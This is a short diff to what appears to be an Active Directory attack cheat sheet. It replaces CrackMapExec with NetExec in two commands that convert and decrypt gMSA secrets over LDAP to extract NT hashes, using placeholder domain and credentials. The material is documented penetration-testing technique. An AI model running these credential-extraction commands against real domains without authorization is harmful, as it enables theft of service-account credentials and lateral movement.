@@ -15,11 +15,11 @@
 
 ### Extract NT hash from the Active Directory
 
-* [mpgn/CrackMapExec](https://github.com/mpgn/CrackMapExec)
+* [mpgn/netexec](https://github.com/Pennyw0rth/NetExec)
   ```ps1
   # Use --lsa to get GMSA ID
-  crackmapexec ldap domain.lab -u user -p 'PWD' --gmsa-convert-id 00[...]99
-  crackmapexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'
+  netexec ldap domain.lab -u user -p 'PWD' --gmsa-convert-id 00[...]99
+  netexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'
   ```
 
 * [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)
